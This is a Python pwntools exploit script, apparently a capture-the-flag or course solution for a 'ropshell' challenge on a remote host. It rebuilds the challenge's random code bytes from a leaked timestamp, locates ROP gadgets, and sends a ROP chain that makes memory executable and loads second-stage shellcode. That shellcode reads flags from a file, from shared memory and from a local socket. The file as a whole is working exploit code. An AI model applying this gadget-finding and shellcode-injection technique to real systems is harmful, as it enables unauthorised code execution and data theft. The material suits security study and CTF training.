#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import pow as pw
from pwn import *
import ctypes
import struct

context.arch = 'amd64'
context.os = 'linux'

LEN_CODE = 10 * 0x10000

r = None
if 'qemu' in sys.argv[1:]:
    r = process("qemu-x86_64-static ./ropshell", shell=True)
elif 'bin' in sys.argv[1:]:
    r = process("./ropshell", shell=False)
elif 'local' in sys.argv[1:]:
    r = remote("localhost", 10494)
else:
    r = remote("up23.zoolab.org", 10494)

if type(r) != pwnlib.tubes.process.process:
    pw.solve_pow(r)

# Get the timestamp
output = r.recvuntil(b"** Timestamp is ")
timestamp_line = r.recvline().decode()
timestamp = int(timestamp_line.strip())

# Get the base address
output = r.recvuntil(b"** Random bytes generated at ")
base_address_line = r.recvline().decode()
base_address = int(base_address_line.split()[-1], 16)

# Seed the random number generator with the timestamp
libc = ctypes.CDLL('libc.so.6')
libc.srand(timestamp)

# Generate the same sequence of random numbers as in the C program
codeint = []
for i in range(LEN_CODE // 4):
    rn = ((libc.rand() << 16) & 0xffffffff | (libc.rand() & 0xffff))
    codeint.append(rn.to_bytes(4, byteorder='little'))
random_index = libc.rand() % (LEN_CODE // 4 - 1)
codeint[random_index] = struct.pack("<I", 0xc3050f)
codeint = b''.join(codeint)

# Find gadgets
if codeint.find(asm("pop rax; ret")) != -1:
    pop_rax_ret = base_address + codeint.find(asm("pop rax; ret"))
else:
    raise ValueError("Assembly instruction 'pop rax; ret' not found in codeint!")

if codeint.find(asm("pop rdi; ret")) != -1:
    pop_rdi_ret = base_address + codeint.find(asm("pop rdi; ret"))
else:
    raise ValueError("Assembly instruction 'pop rdi; ret' not found in codeint!")

if codeint.find(asm("syscall; ret")) != -1:
    syscall_ret = base_address + codeint.find(asm("syscall; ret"))
else:
    raise ValueError("Assembly instruction 'syscall; ret' not found in code_bytes!")

# Print the base address and the positions of the gadgets
print(f"Base address: {hex(base_address)}")
print(f"Position of 'pop rax; ret': {hex(pop_rax_ret)}")
print(f"Position of 'pop rdi; ret': {hex(pop_rdi_ret)}")
print(f"Position of 'syscall; ret': {hex(syscall_ret)}")

payload = b""
payload += p64(pop_rax_ret) + p64(60)     
payload += p64(pop_rdi_ret) + p64(37)
payload += p64(syscall_ret)

r.send(payload)

# Find gadgets
if codeint.find(asm("pop rsi; ret")) != -1:
    pop_rsi_ret = base_address + codeint.find(asm("pop rsi; ret"))
else:
    raise ValueError("Assembly instruction 'pop rsi; ret' not found in codeint!")

if codeint.find(asm("pop rdx; ret")) != -1:
    pop_rdx_ret = base_address + codeint.find(asm("pop rdx; ret"))
else:
    raise ValueError("Assembly instruction 'pop rdx; ret' not found in codeint!")




# Prepare the "/FLAG" string and append it to the payload
flag_str = "/FLAG\0"
payload = b""
start_address = base_address + len(flag_str)

# Prepare the second stage shellcode to read the flag
shellcode = b""
# Calculate the address of the "/FLAG" string
shellcode += flag_str.encode()
# show the FLAG read from the /FLAG file
shellcode += asm(shellcraft.amd64.linux.open(base_address, os.O_RDONLY))  # open the flag file
shellcode += asm(shellcraft.amd64.linux.read('rax', base_address + 1024, 0x100))  # read the flag into the buffer
shellcode += asm(shellcraft.amd64.linux.write(1, base_address + 1024, 'rax'))  # write the flag to stdout
# show the FLAG stored in the shared memory
shellcode += asm(shellcraft.amd64.linux.syscall("SYS_shmget", 0x1337, 0x1000, 0))
shellcode += asm(shellcraft.amd64.linux.syscall("SYS_shmat", 'rax', 0, 0x1000))
shellcode += asm(shellcraft.amd64.linux.write(1, 'rax', 69))  # read the flag into the buffer
# show the FLAG received from the internal network server
shellcode += asm(shellcraft.amd64.linux.syscall("SYS_socket", 2, 1, 0))

shellcode += asm("""
                push   rbp
                mov    rbp, rsp
                sub    rsp, 64
                mov    BYTE PTR [rsp], 0x02
                mov    WORD PTR [rsp+2], 0x3713
                mov    DWORD PTR [rsp+4], 0x0100007f
                lea    rsi, [rbp-64]
""")

shellcode += asm(shellcraft.amd64.linux.syscall("SYS_connect", 'rax', 'rsi', 16))  # connect(sockfd, &sockaddr, 16)
shellcode += asm(shellcraft.amd64.linux.syscall("SYS_read", 'rdi', base_address + 2048, 0x100))  
shellcode += asm(shellcraft.amd64.linux.syscall("SYS_write", 1, base_address + 2048, 'rax'))  # write the flag to stdout

shellcode += asm(shellcraft.amd64.linux.exit('rax'))  # exit gracefully

# Prepare the first stage payload to change memory permissions
payload += p64(pop_rax_ret) + p64(10)  # syscall number for mprotect
payload += p64(pop_rdi_ret) + p64(base_address & ~0xfff)  # address (page-aligned)
payload += p64(pop_rsi_ret) + p64(0x2000)  # size (assuming the second stage shellcode will be within 0x2000 bytes of the base address)
payload += p64(pop_rdx_ret) + p64(7)  # prot = PROT_READ | PROT_WRITE | PROT_EXEC
payload += p64(syscall_ret)  # mprotect syscall

# Add instructions to the first stage payload to read the second stage shellcode into memory
payload += p64(pop_rax_ret) + p64(0)  # syscall number for read
payload += p64(pop_rdi_ret) + p64(0)  # file descriptor for stdin
payload += p64(pop_rsi_ret) + p64(base_address)  # buffer to read the shellcode into
payload += p64(pop_rdx_ret) + p64(len(shellcode))  # number of bytes to read
payload += p64(syscall_ret)  # read syscall

# Add instructions to the first stage payload to jump to the second stage shellcode
payload += p64(start_address)

# Send the first stage payload
print(r.recvuntil(b"** CMD: terminated with exit code 37").decode())
r.send(payload)
# Send the second stage shellcode
r.send(shellcode)

r.interactive()

# vim: set tabstop=4 expandtab shiftwidth=4 softtabstop=4 number cindent fileencoding=utf-8 :
